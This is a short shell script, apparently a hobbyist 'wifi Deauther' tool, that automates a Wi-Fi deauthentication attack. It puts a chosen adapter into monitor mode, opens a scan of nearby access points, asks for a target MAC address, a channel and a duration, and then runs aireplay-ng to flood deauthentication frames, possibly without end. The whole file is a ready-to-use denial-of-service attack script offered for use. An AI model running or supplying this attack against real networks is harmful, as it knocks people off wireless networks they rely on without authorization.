echo [+] wakanda.sh starting 
trap 'printf "\n";stop' 2
sleep 1
clear

printf "\e[1;92m  ----------------------------------\e[0m\n"
printf "\e[1;92m  *       wifi Deauther            * \e[0m\n"
printf "\e[1;92m  *                                * \e[0m\n"
printf "\e[1;92m  *    ~Designed by Rusiru~        *  \e[0m\n"
printf "\e[1;92m  *                                *  \e[0m\n"
printf "\e[1;92m  ---------------------------------\e[0m\n"



echo -

#selecting an interface

ifconfig 

echo -

echo -

read -p  '[+]select your wifi adapter: ' int  
echo -


#seting to monitor mode
echo [+] entering to monitor mode
sleep 2
echo -
echo -
echo -
airmon-ng start  $int


#liestening to the ap's
gnome-terminal -- airodump-ng $int


#requesting data
read -p '[+]macadress: ' maca
read -p '[+]time duration(0 for infinity): ' tme
read -p '[+]channel : ' ch
echo -

#setting up the interface
echo [+] setting up the chanel  
sleep 1
iwconfig $int  channel $ch 
iwconfig $int  channel $ch 
iwconfig $int  channel $ch 
iwconfig $int  channel $ch 
iwconfig $int  channel $ch 

echo -
echo -
#starting the attack
echo [+] starting the attack
echo -
echo -
xterm -e aireplay-ng -0 $tme  -a $maca  $int

echo [+] deauth complete...
echo 

